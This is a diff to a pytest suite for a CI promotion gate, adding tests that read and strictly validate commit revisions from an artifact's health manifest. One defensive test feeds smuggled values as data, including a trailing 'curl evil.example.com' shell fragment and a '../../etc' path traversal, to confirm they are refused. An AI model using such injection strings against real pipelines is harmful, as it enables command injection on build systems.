@@ -2,6 +2,9 @@
 
 Verifies: HSI-OPS-promotion-gate-qa/D — the source deployment is confirmed
 healthy before a promotion proceeds.
+Verifies: DIARY-OPS-artifact-source-attestation/B+C — the source revisions the
+promotion advances are read FROM the artifact, and a promotion refuses when the
+artifact cannot state one.
 
 The gate exists because a promotion advances what a source environment is said
 to have *proved*. An environment that is failing has proved nothing, so
@@ -56,6 +59,9 @@ def _run_body(text: str, step_name: str) -> str:
 
 
 SCRIPT = _run_body(WORKFLOW.read_text(), STEP)
+REVISIONS = _run_body(
+    WORKFLOW.read_text(), "Read the source revisions the artifact reports"
+)
 
 
 @pytest.fixture()
@@ -87,6 +93,13 @@ def invoke(tmp_path):
         for f in ("gcloud", "curl"):
             (bin_dir / f).chmod(0o755)
 
+        # The step hands its fetched health body to the next step through
+        # $GITHUB_ENV rather than re-fetching it, so the harness has to model
+        # that file: the body runs under `set -u`, and an unset GITHUB_ENV
+        # would kill it before any assertion about the gate could be made.
+        github_env = tmp_path / "github_env"
+        github_env.touch()
+
         env = {
             **os.environ,
             "PATH": f"{bin_dir}:{os.environ['PATH']}",
@@ -98,10 +111,13 @@ def invoke(tmp_path):
             "REGION": "europe-west9",
             "PROJECT": "sponsor-dev",
             "SA_EMAIL": "github-actions-sa@example.iam.gserviceaccount.com",
+            "GITHUB_ENV": str(github_env),
         }
-        return subprocess.run(
+        proc = subprocess.run(
             ["bash", "-c", SCRIPT], env=env, capture_output=True, text=True
         )
+        proc.github_env = github_env.read_text()  # type: ignore[attr-defined]
+        return proc
 
     return _invoke
 
@@ -150,3 +166,123 @@ def test_health_body_without_status_refuses(invoke):
     r = invoke(health='{"service":"portal"}')
     assert r.returncode != 0
     assert "status='unknown'" in r.stdout
+
+
+# --- Source-revision attestation (DIARY-OPS-artifact-source-attestation/B+C) --
+
+# The health step above establishes that the source environment is well; this
+# one establishes WHAT it is running. The distinction matters because the
+# promotion's next act is to look a validation result up, and a result found
+# under an identifier the operator supplied verifies the operator's belief
+# rather than the deployment.
+
+
+def revisions(health, **overrides):
+    """Run the revision-read body against a health manifest, as env."""
+    import tempfile
+
+    with tempfile.TemporaryDirectory() as tmp:
+        out = pathlib.Path(tmp) / "github_output"
+        out.touch()
+        env = {
+            **os.environ,
+            "HEALTH_BODY": health,
+            "SOURCE_ENV": "dev",
+            "GITHUB_OUTPUT": str(out),
+            **overrides,
+        }
+        proc = subprocess.run(
+            ["bash", "-c", REVISIONS], env=env, capture_output=True, text=True
+        )
+        proc.output = out.read_text()  # type: ignore[attr-defined]
+        return proc
+
+
+def test_reads_both_revisions_the_artifact_reports():
+    """The one the first draft of this design got wrong. A portal-final image
+    composes two independently pinned core images: `server_commit` is written
+    only when the version-gated portal-server binary is rebuilt, while
+    `core_commit` advances with the sponsor-ci tree the portal UI is compiled
+    from. Reading one and calling it "the" source revision would let a later
+    lookup find a passing record about code the artifact does not contain."""
+    r = revisions(
+        '{"status":"ok","versions":{"server_commit":"b3f21aa",'
+        '"core_commit":"9e4c17dabc1234567890abcdef1234567890abcd"}}'
+    )
+    assert r.returncode == 0, r.stdout + r.stderr
+    assert r.output.strip() == (
+        "source_revisions=b3f21aa 9e4c17dabc1234567890abcdef1234567890abcd"
+    ), r.output
+
+
+def test_collapses_the_pair_when_both_halves_share_a_revision():
+    """A build where the binary and the UI came from one commit reports it
+    twice. The gate downstream would refuse a duplicate lookup for no reason,
+    so the pair is deduplicated here rather than there."""
+    r = revisions(
+        '{"status":"ok","versions":{"server_commit":"b3f21aa","core_commit":"b3f21aa"}}'
+    )
+    assert r.returncode == 0, r.stdout + r.stderr
+    assert r.output.strip() == "source_revisions=b3f21aa", r.output
+
+
+def test_absent_core_commit_refuses():
+    """C: an image built before the attestation cannot say what it is. Reading
+    the one key it does carry and proceeding is how a gate ends up checking the
+    wrong half of the artifact."""
+    r = revisions('{"status":"ok","versions":{"server_commit":"b3f21aa"}}')
+    assert r.returncode != 0, "an artifact that cannot state a revision must be refused"
+    assert "reports no 'core_commit'" in r.stdout
+
+
+def test_absent_server_commit_refuses():
+    r = revisions('{"status":"ok","versions":{"core_commit":"9e4c17d"}}')
+    assert r.returncode != 0
+    assert "reports no 'server_commit'" in r.stdout
+
+
+def test_manifest_without_versions_refuses():
+    r = revisions('{"status":"ok"}')
+    assert r.returncode != 0, "a manifest with no versions block must fail closed"
+    assert "so its source revision cannot be established" in r.stdout or \
+           "source revision of the artifact cannot be established" in r.stdout
+
+
+def test_malformed_revision_refuses_under_its_own_reason():
+    """Absent and malformed are different situations: one is fixed by
+    rebuilding the image, the other means something answered but not with a
+    revision. Reporting them the same way sends the operator to the wrong
+    place."""
+    r = revisions(
+        '{"status":"ok","versions":{"server_commit":"not-a-sha","core_commit":"9e4c17d"}}'
+    )
+    assert r.returncode != 0
+    assert "not a well-formed revision identifier" in r.stdout
+
+
+def test_revision_carrying_a_trailing_shell_fragment_refuses():
+    """The regex is anchored at BOTH ends. This value was read back from a live
+    service and then flows into an object path and command text, so a
+    valid-looking prefix must not carry a payload past the check."""
+    for bad in ('b3f21aa"; curl evil.example.com #', "b3f21aa\n9999999", "../../etc"):
+        r = revisions(
+            '{"status":"ok","versions":{"server_commit":%s,"core_commit":"9e4c17d"}}'
+            % __import__("json").dumps(bad)
+        )
+        assert r.returncode != 0, f"must refuse {bad!r}"
+
+
+def test_uppercase_revision_refuses():
+    """Git emits lowercase hex. An uppercase value did not come from the build,
+    and admitting it would make two spellings of one revision look like two
+    revisions to the lookup."""
+    r = revisions(
+        '{"status":"ok","versions":{"server_commit":"B3F21AA","core_commit":"9e4c17d"}}'
+    )
+    assert r.returncode != 0
+    assert "not a well-formed revision identifier" in r.stdout
+
+
+def test_unparseable_health_body_refuses():
+    r = revisions("<html>502 Bad Gateway</html>")
+    assert r.returncode != 0, "a non-JSON manifest must fail closed"
